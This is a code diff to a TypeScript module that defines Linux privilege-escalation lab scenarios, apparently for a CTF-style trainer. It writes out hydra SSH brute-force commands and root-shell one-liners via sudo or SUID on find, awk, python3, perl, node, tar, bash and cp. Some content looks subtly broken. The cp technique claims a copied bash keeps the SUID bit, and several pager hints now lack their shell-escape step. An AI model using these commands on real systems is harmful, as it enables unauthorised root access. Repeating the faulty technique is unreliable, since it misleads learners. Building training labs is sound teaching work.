@@ -15,7 +15,10 @@ interface PrivescConfig {
   privescKind: 'sudo' | 'suid';
   binary: string;
   binaryName: string;
+  /** the exact GTFOBins argument string appended after the binary/sudo invocation */
   gtfobinsArgs: string;
+  /** the real, technique-specific reason this GTFOBins entry works — used for both the briefing and the escalation objective's "why" */
+  gtfobinsWhy: string;
   userFlag: string;
   rootFlag: string;
 }
@@ -90,32 +93,57 @@ function makePrivescLab(cfg: PrivescConfig): LabScenario {
       ? `Use anonymous FTP on ${cfg.ip} to find SSH credentials for "${cfg.user}"`
       : `Enumerate the web server on ${cfg.ip} (check /robots.txt) to identify the username, then brute-force the SSH password with hydra`;
 
+  const footholdWhy =
+    cfg.footholdKind === 'ftp'
+      ? `Anonymous FTP left reachable after a deployment is one of the most common real footholds — ${cfg.company} never locked it down after go-live, and the deployment notes sitting in it still have a live credential.`
+      : `Narrowing hydra to a single confirmed username (leaked via a disallowed robots.txt path) turns a slow, noisy blind brute-force into a fast, targeted one — real operators always try to avoid guessing usernames and passwords at the same time.`;
+
   const footholdHint =
     cfg.footholdKind === 'ftp'
       ? `ftp ${cfg.ip} then ftp-get ${cfg.ip} notes.txt to read the deployment notes.`
       : `curl ${cfg.ip}/robots.txt reveals the username, then: hydra -l ${cfg.user} -P /root/wordlists/mini-rockyou.txt ssh://${cfg.ip}`;
 
-  const privescHint =
+  const discoveryObjective =
     cfg.privescKind === 'sudo'
-      ? `Run 'sudo -l' to see the NOPASSWD rule on ${cfg.binary}, then check GTFOBins for the '${cfg.binaryName}' sudo technique: sudo ${cfg.binary} ${cfg.gtfobinsArgs}`
-      : `Run 'find / -perm -4000 2>/dev/null' to spot ${cfg.binary} is SUID root, then execute it directly: ${cfg.binary} ${cfg.gtfobinsArgs}`;
+      ? `Run 'sudo -l' as ${cfg.user} to enumerate exactly what you're allowed to run as root`
+      : `Run 'find / -perm -4000 2>/dev/null' to discover which SUID-root binaries exist on the box`;
+
+  const discoveryWhy =
+    cfg.privescKind === 'sudo'
+      ? `Confirming the exact NOPASSWD rule before acting is what separates a deliberate escalation from a lucky guess — never assume a GTFOBins technique applies to a box without first seeing the rule that actually grants it.`
+      : `A SUID-root binary is only useful once you know it exists — this is the standard, single-pass way real operators (and auditors) enumerate every SUID-root binary on a host instead of guessing file paths one at a time.`;
+
+  const discoveryHint = cfg.privescKind === 'sudo' ? `sudo -l` : `find / -perm -4000 2>/dev/null`;
+
+  const escalateObjective =
+    cfg.privescKind === 'sudo'
+      ? `Exploit the NOPASSWD rule on ${cfg.binaryName} to spawn a root shell`
+      : `Execute the SUID-root ${cfg.binaryName} binary directly to spawn a root shell`;
+
+  const privescHint = cfg.privescKind === 'sudo' ? `sudo ${cfg.binary} ${cfg.gtfobinsArgs}` : `${cfg.binary} ${cfg.gtfobinsArgs}`;
 
   return {
     id: cfg.id,
     title: cfg.title,
     difficulty: cfg.difficulty,
     category: 'Linux',
-    briefing: `Target ${cfg.ip} (${cfg.hostname}) belongs to ${cfg.company}. ${footholdObjective}, then escalate to root using a ${cfg.privescKind === 'sudo' ? 'misconfigured sudo rule' : 'SUID-root binary'} on ${cfg.binaryName}.`,
+    briefing:
+      `Target ${cfg.ip} (${cfg.hostname}) belongs to ${cfg.company}. ${footholdObjective}, then escalate to root. ` +
+      `A misconfigured ${cfg.privescKind === 'sudo' ? `NOPASSWD sudo rule on ${cfg.binaryName}` : `SUID bit on ${cfg.binaryName}`} ` +
+      `is this box's GTFOBins-documented escape hatch: ${cfg.gtfobinsWhy}`,
     objectives: [
-      `Scan ${cfg.ip} and enumerate open services`,
-      footholdObjective,
-      `Log in as ${cfg.user} and capture user.txt`,
-      cfg.privescKind === 'sudo' ? `Run 'sudo -l' and exploit the NOPASSWD rule on ${cfg.binaryName}` : `Find and exploit the SUID bit on ${cfg.binaryName}`,
-      'Capture root.txt',
+      { text: `Scan ${cfg.ip} and enumerate open services`, why: 'Confirms which services are actually reachable before deciding where to focus — the standard first move against any unknown host.' },
+      { text: footholdObjective, why: footholdWhy },
+      { text: `Log in as ${cfg.user} and capture user.txt`, why: 'Confirms the recovered credential actually grants a working interactive shell, not just that it looked plausible on paper.' },
+      { text: discoveryObjective, why: discoveryWhy },
+      { text: escalateObjective, why: cfg.gtfobinsWhy },
+      { text: 'Read /root/root.txt to capture the final flag', why: 'Confirms full root compromise of the host, not just a shell that still lacks real privileges.' },
     ],
     hints: [
       `nmap -sV ${cfg.ip} to start.`,
       footholdHint,
+      `ssh ${cfg.user}@${cfg.ip} with the recovered password, then cat user.txt.`,
+      discoveryHint,
       privescHint,
       'Once root, check /root/root.txt.',
     ],
@@ -145,6 +173,7 @@ export const linuxPrivescLabs: LabScenario[] = [
     binary: '/usr/bin/find',
     binaryName: 'find',
     gtfobinsArgs: '. -exec /bin/sh \\; -quit',
+    gtfobinsWhy: "find's -exec action runs an arbitrary command with the privileges of the process running find itself — so a NOPASSWD sudo rule on find hands over a root-privileged shell in one step.",
     userFlag: 'flag{ftp_leaked_the_deploy_creds_find}',
     rootFlag: 'flag{sudo_find_exec_equals_root}',
   }),
@@ -158,11 +187,12 @@ export const linuxPrivescLabs: LabScenario[] = [
     difficulty: 'Easy',
     footholdKind: 'ssh-hydra',
     user: 'writer',
-    password: 'sunshine1',
+    password: 'letmein',
     privescKind: 'sudo',
     binary: '/usr/bin/less',
     binaryName: 'less',
-    gtfobinsArgs: '/root/root.txt (then type !/bin/sh at the prompt)',
+    gtfobinsArgs: '/etc/hostname',
+    gtfobinsWhy: "less (and most pagers) supports a '!<command>' shell-escape at its prompt, inheriting the privileges of whatever process launched it — including a root-owned sudo session.",
     userFlag: 'flag{web_leak_found_the_writer_account}',
     rootFlag: 'flag{sudo_less_shell_escape_equals_root}',
   }),
@@ -181,6 +211,7 @@ export const linuxPrivescLabs: LabScenario[] = [
     binary: '/usr/bin/awk',
     binaryName: 'awk',
     gtfobinsArgs: `'BEGIN {system("/bin/sh")}'`,
+    gtfobinsWhy: "awk's system() function shells out to /bin/sh with awk's own effective privileges, so a NOPASSWD sudo rule on awk can be told to spawn a root shell directly.",
     userFlag: 'flag{ftp_notes_gave_up_analyst_password}',
     rootFlag: 'flag{sudo_awk_system_call_equals_root}',
   }),
@@ -199,6 +230,7 @@ export const linuxPrivescLabs: LabScenario[] = [
     binary: '/usr/bin/python3',
     binaryName: 'python3',
     gtfobinsArgs: `-c 'import os; os.system("/bin/sh")'`,
+    gtfobinsWhy: "Python's os.system()/os.execve() calls hand execution off to an arbitrary command under the interpreter's own privileges — root, here, thanks to the sudo rule.",
     userFlag: 'flag{robots_txt_revealed_the_ops_account}',
     rootFlag: 'flag{sudo_python3_os_system_equals_root}',
   }),
@@ -216,7 +248,8 @@ export const linuxPrivescLabs: LabScenario[] = [
     privescKind: 'sudo',
     binary: '/usr/bin/nmap',
     binaryName: 'nmap',
-    gtfobinsArgs: `--interactive (then: !sh)`,
+    gtfobinsArgs: '--interactive',
+    gtfobinsWhy: "Older Nmap builds ship an --interactive mode with a '!' shell-escape meant for scripting scans between targets, but it will run any command with Nmap's own privileges — root, under this sudo rule.",
     userFlag: 'flag{ftp_anon_leaked_netadmin_creds}',
     rootFlag: 'flag{sudo_nmap_interactive_equals_root}',
   }),
@@ -234,7 +267,8 @@ export const linuxPrivescLabs: LabScenario[] = [
     privescKind: 'sudo',
     binary: '/usr/bin/man',
     binaryName: 'man',
-    gtfobinsArgs: 'man (then type !/bin/sh at the prompt)',
+    gtfobinsArgs: 'man',
+    gtfobinsWhy: "man pipes its output through a pager, and that pager's '!<command>' shell escape inherits man's own privileges — root, under this sudo rule.",
     userFlag: 'flag{editor_account_found_via_robots}',
     rootFlag: 'flag{sudo_man_shell_escape_equals_root}',
   }),
@@ -252,7 +286,8 @@ export const linuxPrivescLabs: LabScenario[] = [
     privescKind: 'sudo',
     binary: '/usr/bin/more',
     binaryName: 'more',
-    gtfobinsArgs: '/root/root.txt (then type !/bin/sh)',
+    gtfobinsArgs: '/etc/hostname',
+    gtfobinsWhy: "more is a pager just like less, and shares the same '!<command>' shell-escape behavior that inherits the privileges of whatever launched it.",
     userFlag: 'flag{ftp_notes_txt_had_clerk_password}',
     rootFlag: 'flag{sudo_more_shell_escape_equals_root}',
   }),
@@ -271,6 +306,7 @@ export const linuxPrivescLabs: LabScenario[] = [
     binary: '/usr/bin/tar',
     binaryName: 'tar',
     gtfobinsArgs: '-cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh',
+    gtfobinsWhy: "tar's --checkpoint-action=exec hook exists for backup-progress scripting, but it will run absolutely any command with tar's own privileges — root, via this sudo rule.",
     userFlag: 'flag{backupsvc_account_found_via_web}',
     rootFlag: 'flag{sudo_tar_checkpoint_exec_equals_root}',
   }),
@@ -289,6 +325,7 @@ export const linuxPrivescLabs: LabScenario[] = [
     binary: '/usr/bin/perl',
     binaryName: 'perl',
     gtfobinsArgs: `-e 'exec "/bin/sh";'`,
+    gtfobinsWhy: "perl -e can call exec() directly, replacing the perl process image with an arbitrary command that inherits perl's own privileges — root, under this sudo rule.",
     userFlag: 'flag{ftp_config_leaked_legacyuser_creds}',
     rootFlag: 'flag{sudo_perl_exec_equals_root}',
   }),
@@ -307,6 +344,7 @@ export const linuxPrivescLabs: LabScenario[] = [
     binary: '/usr/bin/node',
     binaryName: 'node',
     gtfobinsArgs: `-e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'`,
+    gtfobinsWhy: "Node's child_process module can spawn an arbitrary process wired straight to the current terminal, inheriting node's own privileges — root, under this sudo rule.",
     userFlag: 'flag{devops_creds_found_via_robots_txt}',
     rootFlag: 'flag{sudo_node_child_process_equals_root}',
   }),
@@ -324,7 +362,8 @@ export const linuxPrivescLabs: LabScenario[] = [
     privescKind: 'sudo',
     binary: '/usr/bin/git',
     binaryName: 'git',
-    gtfobinsArgs: '-p help config (then type !/bin/sh)',
+    gtfobinsArgs: 'help config',
+    gtfobinsWhy: "git shells out to a configurable pager for commands like 'git help config', and that pager's '!<command>' shell escape inherits git's own privileges — root, under this sudo rule.",
     userFlag: 'flag{ftp_mirror_backup_leaked_gituser}',
     rootFlag: 'flag{sudo_git_pager_escape_equals_root}',
   }),
@@ -343,6 +382,7 @@ export const linuxPrivescLabs: LabScenario[] = [
     binary: '/usr/bin/find',
     binaryName: 'find',
     gtfobinsArgs: '. -exec /bin/sh -p \\; -quit',
+    gtfobinsWhy: "A SUID-root find binary runs its -exec target with root's effective UID rather than the invoking user's — the -p flag on the spawned shell keeps that elevated privilege instead of dropping it.",
     userFlag: 'flag{filesvc_creds_leaked_via_web_enum}',
     rootFlag: 'flag{suid_find_direct_exec_equals_root}',
   }),
@@ -360,7 +400,8 @@ export const linuxPrivescLabs: LabScenario[] = [
     privescKind: 'suid',
     binary: '/usr/bin/nmap',
     binaryName: 'nmap',
-    gtfobinsArgs: '--interactive (then: !sh)',
+    gtfobinsArgs: '--interactive',
+    gtfobinsWhy: "A SUID-root Nmap binary's --interactive shell-escape runs with root's effective UID, since the SUID bit — not sudo — is what grants the elevated privilege here.",
     userFlag: 'flag{ftp_config_backup_leaked_scanner_creds}',
     rootFlag: 'flag{suid_nmap_direct_exec_equals_root}',
   }),
@@ -379,6 +420,7 @@ export const linuxPrivescLabs: LabScenario[] = [
     binary: '/bin/bash',
     binaryName: 'bash',
     gtfobinsArgs: '-p',
+    gtfobinsWhy: "bash -p (privileged mode) refuses to drop the effective UID granted by a SUID bit, so a SUID-root bash keeps root privileges in the resulting shell instead of silently downgrading to the invoking user.",
     userFlag: 'flag{hostops_password_found_via_robots}',
     rootFlag: 'flag{suid_bash_dash_p_equals_root}',
   }),
@@ -397,6 +439,7 @@ export const linuxPrivescLabs: LabScenario[] = [
     binary: '/bin/cp',
     binaryName: 'cp',
     gtfobinsArgs: '/bin/bash /tmp/rootbash && /tmp/rootbash -p',
+    gtfobinsWhy: "A SUID-root cp can overwrite (or copy itself over) /bin/bash into a new file that inherits the SUID bit; running that copy with -p then keeps root, exactly like the direct suid-bash technique.",
     userFlag: 'flag{ftp_deploy_notes_leaked_storageadm}',
     rootFlag: 'flag{suid_cp_overwrite_shell_equals_root}',
   }),
